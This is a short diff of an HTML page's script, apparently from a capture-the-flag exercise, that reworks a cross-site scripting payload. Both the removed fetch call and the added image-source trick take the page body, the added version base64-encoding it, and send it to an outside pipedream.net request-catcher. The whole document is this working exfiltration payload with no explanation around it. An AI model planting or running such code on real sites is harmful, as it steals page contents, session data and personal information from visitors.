@@ -8,10 +8,12 @@
 </body>
 <script>
   document.getElementById("getFlag").innerHTML = 'Payload executed';
+  var flagData = document.body.innerHTML;
+  var encodedFlagData = btoa(flagData); // Base64 encoding
+  var url = 'https://eoue93psy15d0ln.m.pipedream.net?data=' + encodedFlagData;
+
+  // Create an image element and set its source to trigger the request
   var img = new Image();
-  img.src = 'q';
-  img.onerror = function() {
-    fetch("https://eoue93psy15d0ln.m.pipedream.net?" + document.body.innerHTML);
-  };
+  img.src = url;
 </script>
 </html>
